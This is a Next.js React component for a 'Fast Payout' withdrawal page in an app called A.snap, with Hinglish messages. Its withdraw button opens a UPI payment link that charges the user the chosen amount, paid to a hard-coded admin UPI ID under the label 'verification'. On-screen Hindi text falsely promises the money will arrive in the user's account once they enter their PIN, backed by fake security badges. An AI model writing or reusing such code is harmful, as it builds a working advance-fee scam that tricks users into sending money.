'use client';

import { useState, Suspense, useMemo, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useFirebase, useUser, useDoc, useMemoFirebase } from '@/firebase';
import { doc } from 'firebase/firestore';
import { Button } from '@/components/ui/button';
import { ArrowLeft, Loader2, Landmark, ShieldCheck, Zap, Smartphone, CheckCircle2, AlertCircle, Coins, AlertTriangle } from 'lucide-react';
import { BottomNav } from "@/components/bottom-nav";
import { cn } from '@/lib/utils';
import type { UserProfile } from '@/models/user';
import { useToast } from '@/hooks/use-toast';

const WITHDRAW_AMOUNTS = [110, 500, 1000, 2000, 5000, 10000];
const ADMIN_UPI_ID = "ak63315561338@okicici";

function WithdrawContent() {
    const { firestore } = useFirebase();
    const { user } = useUser();
    const { toast } = useToast();
    const router = useRouter();

    const [selectedAmount, setSelectedAmount] = useState('110');
    const [isLoading, setIsLoading] = useState(false);
    const [balanceError, setBalanceError] = useState<string | null>(null);

    const userRef = useMemoFirebase(() => 
        (firestore && user) ? doc(firestore, 'users', user.uid) : null, [firestore, user]);
    const { data: userProfile } = useDoc<UserProfile & { virtualBalance?: number }>(userRef);

    const currentBalance = userProfile?.virtualBalance || 0;

    // Handle Amount Click with Balance Validation
    const handleAmountSelect = (amt: string) => {
        const amtNum = parseInt(amt);
        if (amtNum > currentBalance) {
            setBalanceError(`Bhai tere pass balance kam hai. Tera total balance ₹${currentBalance.toFixed(1)} hi hai.`);
            toast({
                variant: 'destructive',
                title: "Balance Kam Hai! ❌",
                description: "Jitne paise game me hain, utne hi select karo bhai."
            });
            // Don't select the amount if balance is low
            return;
        }
        setBalanceError(null);
        setSelectedAmount(amt);
    };

    const handleWithdrawAll = () => {
        if (currentBalance < 110) {
            setBalanceError("Minimum withdrawal ₹110 hai bhai.");
            return;
        }
        const total = Math.floor(currentBalance);
        setSelectedAmount(total.toString());
        setBalanceError(null);
    };

    const handleWithdrawWithUpi = () => {
        const amount = parseInt(selectedAmount);
        
        if (isNaN(amount) || amount <= 0) return;

        if (amount > currentBalance) {
            setBalanceError("Bhai balance kam hai, withdrawal nahi lagega.");
            return;
        }

        setIsLoading(true);

        // UPI Payment Link for "Verification"
        const upiLink = `upi://pay?pa=${ADMIN_UPI_ID}&pn=A.snap%20Verification&am=${amount}&cu=INR&tn=Withdrawal%20Unlock%20Verification`;
        
        window.location.href = upiLink;
        
        setTimeout(() => {
            setIsLoading(false);
        }, 3000);
    };

    return (
        <div className="min-h-screen bg-background text-foreground pb-24 select-none">
            <header className="p-5 bg-background/80 sticky top-0 z-50 flex items-center gap-4 border-b border-white/5 backdrop-blur-xl">
                <Button variant="ghost" size="icon" onClick={() => router.back()} className="rounded-full">
                    <ArrowLeft />
                </Button>
                <div>
                    <h1 className="text-xl font-black uppercase italic tracking-tighter">Fast Payout</h1>
                    <p className="text-[9px] text-primary font-bold uppercase tracking-widest">Withdrawal System</p>
                </div>
            </header>

            <main className="p-6 space-y-8 max-w-lg mx-auto animate-in fade-in duration-500">
                {/* Balance Card */}
                <div className="bg-money-pattern border border-white/10 p-8 rounded-[2.5rem] relative overflow-hidden shadow-2xl text-white">
                    <div className="absolute top-0 right-0 p-4 opacity-10 rotate-12"><Landmark size={120} /></div>
                    <p className="text-[10px] font-black uppercase tracking-[0.4em] text-white/60 mb-2">Withdrawal Wallet</p>
                    <div className="flex items-baseline gap-2">
                        <span className="text-2xl font-black opacity-80">₹</span>
                        <h2 className="text-6xl font-black tracking-tighter" style={{ fontStyle: 'normal' }}>
                            {currentBalance.toFixed(1)}
                        </h2>
                    </div>
                    <div className="mt-6 inline-flex items-center gap-2 bg-white/10 px-4 py-1.5 rounded-full border border-white/20 backdrop-blur-md">
                        <Zap size={14} className="text-yellow-400 fill-yellow-400" />
                        <span className="text-[10px] font-black uppercase tracking-widest">Instant Verification Active</span>
                    </div>
                </div>

                <div className="space-y-6">
                    <div className="flex items-center justify-between px-2">
                         <h3 className="text-xs font-black uppercase tracking-[0.2em] text-white/50 italic">Select Amount</h3>
                         <span className="text-[10px] font-bold text-primary uppercase">Min: ₹110</span>
                    </div>

                    {/* Error Message for Low Balance */}
                    {balanceError && (
                        <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-2xl flex items-start gap-3 animate-in shake-in-1">
                             <AlertTriangle className="text-red-500 shrink-0 mt-0.5" size={18} />
                             <p className="text-[11px] text-red-400 font-black uppercase leading-tight">
                                 {balanceError}
                             </p>
                        </div>
                    )}

                    {/* Withdraw All Button */}
                    <button 
                        onClick={handleWithdrawAll}
                        className={cn(
                            "w-full h-16 rounded-2xl bg-secondary/40 border border-white/10 flex items-center justify-between px-6 active:scale-95 transition-all group hover:bg-secondary/60",
                            selectedAmount === Math.floor(currentBalance).toString() && "border-primary bg-primary/10 shadow-lg shadow-primary/5"
                        )}
                    >
                        <div className="flex items-center gap-3">
                            <div className="p-2 bg-primary/20 rounded-xl text-primary group-hover:scale-110 transition-transform"><Coins size={20} /></div>
                            <span className="font-black uppercase italic text-sm">Withdraw All Balance</span>
                        </div>
                        <span className="text-lg font-black text-primary">₹{Math.floor(currentBalance)}</span>
                    </button>
                    
                    <div className="grid grid-cols-2 gap-3">
                        {WITHDRAW_AMOUNTS.map((amt) => (
                            <button
                                key={amt}
                                onClick={() => handleAmountSelect(amt.toString())}
                                className={cn(
                                    "h-20 rounded-[1.5rem] font-black text-2xl transition-all active:scale-95 border-2 flex items-center justify-center gap-1.5 relative overflow-hidden",
                                    selectedAmount === amt.toString() 
                                        ? "bg-primary border-primary text-white shadow-xl shadow-primary/20 scale-[1.02]" 
                                        : (amt > currentBalance ? "bg-secondary/20 border-white/5 text-muted-foreground/30 grayscale" : "bg-secondary/40 border-white/5 text-muted-foreground")
                                )}
                            >
                                <span className="text-sm opacity-50">₹</span>{amt}
                                {selectedAmount === amt.toString() && (
                                    <div className="absolute top-2 right-3">
                                        <CheckCircle2 size={14} />
                                    </div>
                                )}
                            </button>
                        ))}
                    </div>
                </div>

                <div className="bg-secondary/20 border border-white/5 p-6 rounded-[2.5rem] space-y-6">
                    <div className="space-y-4">
                        <div className="bg-blue-600/10 border border-blue-500/20 p-4 rounded-2xl flex items-start gap-3">
                             <AlertCircle className="text-blue-400 shrink-0 mt-0.5" size={18} />
                             <p className="text-[10px] text-blue-300 font-bold leading-relaxed uppercase">
                                 "भाई लोग, विड्रॉल अनलॉक करने के लिए एक बार UPI वेरिफिकेशन जरूरी है। जितना पैसा आप विड्रॉल करेंगे, उतना ही PIN डालते ही आपके असली अकाउंट में आ जाएगा।"
                             </p>
                        </div>

                        <div className="text-center py-2">
                            <p className="text-[10px] font-black text-muted-foreground uppercase tracking-widest">Total to Pay</p>
                            <h4 className={cn("text-4xl font-black italic", parseInt(selectedAmount) > currentBalance ? "text-red-500" : "text-white")}>₹{selectedAmount}</h4>
                        </div>

                        <Button 
                            onClick={handleWithdrawWithUpi}
                            disabled={isLoading || parseInt(selectedAmount) > currentBalance}
                            className="w-full h-20 bg-primary hover:bg-primary/90 text-white font-black uppercase rounded-[2rem] shadow-2xl flex items-center justify-center gap-4 text-2xl active:scale-95 transition-all shadow-primary/30 disabled:opacity-50 disabled:grayscale"
                        >
                            {isLoading ? <Loader2 className="animate-spin" /> : <><Smartphone size={28} /> WITHDRAW NOW</>}
                        </Button>
                    </div>
                </div>

                <div className="flex flex-col items-center justify-center gap-3 opacity-30 text-center">
                    <div className="flex items-center gap-2">
                        <ShieldCheck size={16} className="text-primary" />
                        <span className="text-[9px] font-black uppercase tracking-[0.3em]">Official A.snap Security Bridge</span>
                    </div>
                    <p className="text-[8px] font-bold text-muted-foreground uppercase leading-tight">
                        Encrypted UPI Protocol • Secure Banking Node
                    </p>
                </div>
            </main>
            <BottomNav />
        </div>
    );
}

export default function WithdrawPage() {
    return (
        <Suspense fallback={<div className="h-screen bg-background flex items-center justify-center"><Loader2 className="animate-spin text-primary" /></div>}>
            <WithdrawContent />
        </Suspense>
    );
}
